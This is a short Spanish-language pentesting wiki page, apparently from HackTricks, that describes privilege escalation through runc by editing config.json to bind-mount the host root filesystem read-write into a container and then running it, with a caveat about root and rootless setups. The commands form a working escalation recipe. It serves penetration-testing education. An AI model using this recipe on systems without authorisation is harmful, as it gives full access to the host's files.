# Escalada de privilegios de RunC

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Si quieres obtener más información sobre **runc**, consulta la siguiente página:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Si descubres que `runc` está instalado en el host, es posible que puedas **ejecutar un contenedor montando la carpeta raíz / del host**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Esto no siempre funcionará, ya que la operación predeterminada de runc consiste en ejecutarse como root, por lo que ejecutarlo como un usuario sin privilegios simplemente no puede funcionar (a menos que tengas una configuración rootless). Convertir una configuración rootless en la predeterminada generalmente no es una buena idea, porque existen bastantes restricciones dentro de los contenedores rootless que no se aplican fuera de los contenedores rootless.

{{#include ../../banners/hacktricks-training.md}}
